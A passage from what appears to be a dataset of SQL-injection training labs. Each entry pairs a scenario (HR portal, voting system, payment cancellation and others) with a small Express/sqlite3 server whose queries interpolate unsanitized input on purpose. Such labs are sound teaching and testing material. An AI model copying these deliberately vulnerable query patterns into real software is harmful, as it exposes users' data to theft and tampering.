  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE tickets (id INTEGER PRIMARY KEY, status TEXT)\");\n  db.run(\"INSERT INTO tickets (status) VALUES ('open')\");\n});\n\napp.post('/ticketStatus', (req, res) => {\n  const ticketId = req.body.ticketId;\n  // Vulnerable: unsanitized ticketId\n  const query = `SELECT * FROM tickets WHERE id = '${ticketId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in dynamic employee record search",
  "Lab Description": "An HR portal allows searching for employee records based on a keyword. The unsanitized input in the WHERE clause lets attackers retrieve records for all employees.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE employees (id INTEGER PRIMARY KEY, name TEXT, department TEXT)\");\n  db.run(\"INSERT INTO employees (name, department) VALUES ('John Doe', 'Engineering')\");\n});\n\napp.get('/searchEmployee', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM employees WHERE name LIKE '%${keyword}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in online library book reservation",
  "Lab Description": "A library system accepts a book title via POST data to reserve a book. The unsanitized title enables attackers to inject SQL and reserve books they should not have access to.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE books (id INTEGER PRIMARY KEY, title TEXT, reserved INTEGER)\");\n  db.run(\"INSERT INTO books (title, reserved) VALUES ('The Great Gatsby', 0)\");\n});\n\napp.post('/reserveBook', (req, res) => {\n  const title = req.body.title;\n  const query = `UPDATE books SET reserved = 1 WHERE title = '${title}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Book reserved');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in membership subscription form",
  "Lab Description": "A membership form inserts user emails into the database without sanitization. Attackers can inject SQL to add additional records or retrieve data from the subscribers table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE members (id INTEGER PRIMARY KEY, email TEXT)\");\n});\n\napp.post('/subscribeMember', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO members (email) VALUES ('${email}')`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Subscription successful');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in online poll results retrieval",
  "Lab Description": "An online poll system retrieves poll results using an unsanitized poll ID. Attackers can inject SQL to view results for all polls or alter poll outcomes.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE polls (id INTEGER PRIMARY KEY, question TEXT, results TEXT)\");\n  db.run(\"INSERT INTO polls (question, results) VALUES ('Favorite color?', 'Blue:10,Red:5')\");\n});\n\napp.post('/pollResults', (req, res) => {\n  const pollId = req.body.pollId;\n  const query = `SELECT results FROM polls WHERE id = '${pollId}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (row) res.send(row.results);\n    else res.send('Poll not found');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in forum thread search",
  "Lab Description": "A forum search endpoint takes a keyword to search thread titles. Unsanitized input enables attackers to inject SQL and retrieve threads beyond the intended scope.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE threads (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO threads (title, content) VALUES ('General Discussion', 'Welcome to the forum')\");\n});\n\napp.get('/searchThread', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM threads WHERE title LIKE '%${keyword}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in HR leave application system",
  "Lab Description": "An HR portal accepts leave application details via POST data. The unsanitized employee ID in the SQL query allows attackers to inject SQL and manipulate leave records.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE leave_applications (id INTEGER PRIMARY KEY, employeeId TEXT, leaveDays INTEGER)\");\n  db.run(\"INSERT INTO leave_applications (employeeId, leaveDays) VALUES ('emp001', 5)\");\n});\n\napp.post('/applyLeave', (req, res) => {\n  const employeeId = req.body.employeeId;\n  const leaveDays = req.body.leaveDays;\n  const query = `UPDATE leave_applications SET leaveDays = ${leaveDays} WHERE employeeId = '${employeeId}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Leave application updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in insurance claim processing",
  "Lab Description": "An insurance portal processes claims using an unsanitized claim number. Attackers can inject SQL to retrieve or modify claim information.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE claims (id INTEGER PRIMARY KEY, claimNumber TEXT, status TEXT)\");\n  db.run(\"INSERT INTO claims (claimNumber, status) VALUES ('CLM1001', 'pending')\");\n});\n\napp.post('/processClaim', (req, res) => {\n  const claimNumber = req.body.claimNumber;\n  const query = `UPDATE claims SET status = 'approved' WHERE claimNumber = '${claimNumber}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Claim processed');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in online voting system",
  "Lab Description": "An online voting system retrieves candidate votes using an unsanitized candidate ID. Attackers can inject SQL to manipulate vote counts.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE votes (id INTEGER PRIMARY KEY, candidateId TEXT, voteCount INTEGER)\");\n  db.run(\"INSERT INTO votes (candidateId, voteCount) VALUES ('cand01', 100)\");\n});\n\napp.post('/vote', (req, res) => {\n  const candidateId = req.body.candidateId;\n  const query = `UPDATE votes SET voteCount = voteCount + 1 WHERE candidateId = '${candidateId}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Vote recorded');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Unsanitized profile bio update",
"Lab Description": "A user profile update endpoint accepts a 'bio' field without sanitization. An attacker can inject SQL into the bio field to retrieve or modify other user data.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE profiles (id INTEGER PRIMARY KEY, username TEXT, bio TEXT)\");\n  db.run(\"INSERT INTO profiles (username, bio) VALUES ('alice', 'Hello world')\");\n});\n\napp.post('/updateBio', (req, res) => {\n  const username = req.body.username;\n  const bio = req.body.bio; // Vulnerable: unsanitized input\n  const query = `UPDATE profiles SET bio = '${bio}' WHERE username = '${username}'`;\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Profile updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Product price update with unsanitized value",
"Lab Description": "A product management endpoint allows updating the price using unsanitized input. An attacker can inject SQL to change prices for multiple products.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Laptop', 999.99)\");\n});\n\napp.post('/updatePrice', (req, res) => {\n  const product = req.body.product;\n  const newPrice = req.body.newPrice; // Vulnerable: unsanitized\n  const query = `UPDATE products SET price = ${newPrice} WHERE name = '${product}'`;\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Price updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Blog post retrieval with error-based injection",
"Lab Description": "A blog platform retrieves posts based on a title provided by the user. Poor error handling reveals SQL errors that an attacker can use to deduce the schema.",
"Vulnerability name": "SQL Injection (Error-based)",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE posts (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO posts (title, content) VALUES ('Hello', 'Welcome to my blog')\");\n});\n\napp.get('/getPost', (req, res) => {\n  const title = req.query.title;\n  const query = `SELECT * FROM posts WHERE title = '${title}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send(err.message);\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Feedback submission vulnerability in comment field",
"Lab Description": "A feedback form accepts comments without sanitization. An attacker can inject SQL code in the comment field to manipulate feedback records.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE feedback (id INTEGER PRIMARY KEY, comment TEXT)\");\n});\n\napp.post('/submitFeedback', (req, res) => {\n  const comment = req.body.comment;\n  const query = `INSERT INTO feedback (comment) VALUES ('${comment}')`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Feedback submitted');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Document file search vulnerability in management system",
"Lab Description": "A document management system allows searching for files by name. The search query is constructed using unsanitized input, enabling an attacker to inject SQL to view other files.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE documents (id INTEGER PRIMARY KEY, filename TEXT, content TEXT)\");\n  db.run(\"INSERT INTO documents (filename, content) VALUES ('report.pdf', 'Annual Report')\");\n});\n\napp.get('/searchFile', (req, res) => {\n  const filename = req.query.filename;\n  const query = `SELECT * FROM documents WHERE filename = '${filename}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Customer support ticket creation with injection",
"Lab Description": "A customer support system allows users to submit tickets. Unsanitized input in the ticket description allows attackers to inject SQL to alter or extract ticket details.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE tickets (id INTEGER PRIMARY KEY, subject TEXT, description TEXT)\");\n});\n\napp.post('/createTicket', (req, res) => {\n  const subject = req.body.subject;\n  const description = req.body.description;\n  const query = `INSERT INTO tickets (subject, description) VALUES ('${subject}', '${description}')`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Ticket created');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Dynamic report generation with concatenated parameters",
"Lab Description": "A reporting system dynamically constructs SQL queries from multiple parameters provided by the user. The lack of proper sanitization allows an attacker to inject SQL commands that modify the report results.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reports (id INTEGER PRIMARY KEY, category TEXT, data TEXT)\");\n  db.run(\"INSERT INTO reports (category, data) VALUES ('sales', 'Q1 Report')\");\n});\n\napp.post('/generateReport', (req, res) => {\n  const category = req.body.category;\n  const filter = req.body.filter;\n  const query = `SELECT * FROM reports WHERE category = '${category}' AND data LIKE '%${filter}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Survey response collection vulnerability",
"Lab Description": "A survey system collects responses using unsanitized input, enabling attackers to inject SQL commands that can leak or modify survey data.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE survey (id INTEGER PRIMARY KEY, question TEXT, response TEXT)\");\n  db.run(\"INSERT INTO survey (question, response) VALUES ('Satisfaction', 'Good')\");\n});\n\napp.post('/submitSurvey', (req, res) => {\n  const question = req.body.question;\n  const response = req.body.response;\n  const query = `INSERT INTO survey (question, response) VALUES ('${question}', '${response}')`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Survey submitted');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Social network friend search injection",
"Lab Description": "A social network search feature for friends uses unsanitized input, allowing an attacker to inject SQL and retrieve the complete user list including hidden friends.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, hidden INTEGER)\");\n  db.run(\"INSERT INTO users (name, hidden) VALUES ('Bob', 0)\");\n  db.run(\"INSERT INTO users (name, hidden) VALUES ('Eve', 1)\");\n});\n\napp.get('/searchFriends', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM users WHERE name LIKE '%${keyword}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "E-commerce product filtering injection",
"Lab Description": "An e-commerce site uses unsanitized filters for product search. An attacker can inject SQL to bypass filtering and retrieve all product data.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Camera', 299)\");\n});\n\napp.get('/filterProducts', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM products WHERE name LIKE '%${filter}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Admin dashboard modification via injection",
"Lab Description": "An admin dashboard allows modifications to site settings. Unsanitized inputs in the SQL query enable attackers to inject SQL and alter configuration data.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE settings (id INTEGER PRIMARY KEY, key TEXT, value TEXT)\");\n  db.run(\"INSERT INTO settings (key, value) VALUES ('site_mode', 'production')\");\n});\n\napp.post('/updateSettings', (req, res) => {\n  const key = req.body.key;\n  const value = req.body.value;\n  const query = `UPDATE settings SET value = '${value}' WHERE key = '${key}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Settings updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Hotel booking reservation unsanitized room type",
"Lab Description": "A hotel booking system allows users to select a room type. The unsanitized room type parameter lets attackers inject SQL to book any room regardless of availability.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE bookings (id INTEGER PRIMARY KEY, room_type TEXT, booked INTEGER)\");\n  db.run(\"INSERT INTO bookings (room_type, booked) VALUES ('Deluxe', 0)\");\n});\n\napp.post('/bookRoom', (req, res) => {\n  const roomType = req.body.roomType;\n  const query = `UPDATE bookings SET booked = 1 WHERE room_type = '${roomType}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Room booked');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Login tracking vulnerability with unsanitized logging",
"Lab Description": "A system that logs every login attempt concatenates user input directly into SQL logs. Attackers can inject SQL to alter log entries and hide their activity.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE login_logs (id INTEGER PRIMARY KEY, username TEXT, status TEXT)\");\n});\n\napp.post('/loginLog', (req, res) => {\n  const username = req.body.username;\n  const status = req.body.status; // Unsanitized\n  const query = `INSERT INTO login_logs (username, status) VALUES ('${username}', '${status}')`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Log entry created');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Analytics endpoint vulnerability exposing sensitive data",
"Lab Description": "An analytics endpoint constructs SQL queries based on unsanitized parameters. Attackers can inject SQL to retrieve all analytic data, including confidential metrics.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE analytics (id INTEGER PRIMARY KEY, metric TEXT, value REAL)\");\n  db.run(\"INSERT INTO analytics (metric, value) VALUES ('Revenue', 5000)\");\n});\n\napp.post('/analytics', (req, res) => {\n  const metric = req.body.metric;\n  const query = `SELECT * FROM analytics WHERE metric = '${metric}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "News article management injection for unauthorized edits",
"Lab Description": "A news CMS allows editors to update articles. Unsanitized input in the update query enables attackers to modify articles not assigned to them.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO articles (title, content) VALUES ('Breaking News', 'Details here')\");\n});\n\napp.post('/updateArticle', (req, res) => {\n  const title = req.body.title;\n  const content = req.body.content;\n  const query = `UPDATE articles SET content = '${content}' WHERE title = '${title}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Article updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "User comments moderation tool injection",
"Lab Description": "A moderation tool for user comments fails to sanitize input, enabling attackers to inject SQL and manipulate the comments displayed.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, comment TEXT)\");\n  db.run(\"INSERT INTO comments (comment) VALUES ('Great article!')\");\n});\n\napp.post('/moderate', (req, res) => {\n  const comment = req.body.comment;\n  const query = `UPDATE comments SET comment = '${comment}' WHERE id = 1`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Comment updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Bulk user import vulnerability via CSV injection",
"Lab Description": "This lab simulates a bulk user import process where CSV data is processed without sanitization, allowing an attacker to inject additional SQL commands during the import process.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.text());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT)\");\n});\n\napp.post('/importCSV', (req, res) => {\n  const lines = req.body.split('\\n');\n  lines.forEach(line => {\n    const [name, email] = line.split(\",\");\n    const query = `INSERT INTO users (name, email) VALUES ('${name}', '${email}')`;\n    console.log('Executing query:', query);\n    db.run(query);\n  });\n  res.send('Bulk import completed');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Payment processing order cancellation injection",
"Lab Description": "A payment processing system allows cancellation of orders using an unsanitized order ID. Attackers can inject SQL to cancel orders they should not be able to cancel.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, status TEXT)\");\n  db.run(\"INSERT INTO orders (status) VALUES ('active')\");\n});\n\napp.post('/cancelOrder', (req, res) => {\n  const orderId = req.body.orderId;\n  const query = `UPDATE orders SET status = 'cancelled' WHERE id = '${orderId}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Order cancelled');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Library database search injection",
"Lab Description": "A library database search system constructs SQL queries from user-provided keywords. Attackers can inject SQL to retrieve all book records, including restricted ones.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE books (id INTEGER PRIMARY KEY, title TEXT, author TEXT)\");\n  db.run(\"INSERT INTO books (title, author) VALUES ('Secret Book', 'Unknown')\");\n});\n\napp.get('/searchBooks', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM books WHERE title LIKE '%${keyword}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Real-time chat message retrieval injection",
"Lab Description": "A chat application retrieves messages based on a conversation ID passed via query parameters. Unsanitized input enables attackers to inject SQL to retrieve messages from other conversations.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE messages (id INTEGER PRIMARY KEY, conversationId TEXT, message TEXT)\");\n  db.run(\"INSERT INTO messages (conversationId, message) VALUES ('conv1', 'Hello')\");\n});\n\napp.get('/getMessages', (req, res) => {\n  const convId = req.query.convId;\n  const query = `SELECT * FROM messages WHERE conversationId = '${convId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Vendor details retrieval with unsanitized input",
"Lab Description": "A vendor management system retrieves vendor details based on an ID provided via POST data. The unsanitized input allows attackers to inject SQL and retrieve details of all vendors.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE vendors (id INTEGER PRIMARY KEY, name TEXT, email TEXT)\");\n  db.run(\"INSERT INTO vendors (name, email) VALUES ('VendorA', 'contact@vendora.com')\");\n});\n\napp.post('/getVendor', (req, res) => {\n  const vendorId = req.body.vendorId;\n  const query = `SELECT * FROM vendors WHERE id = '${vendorId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
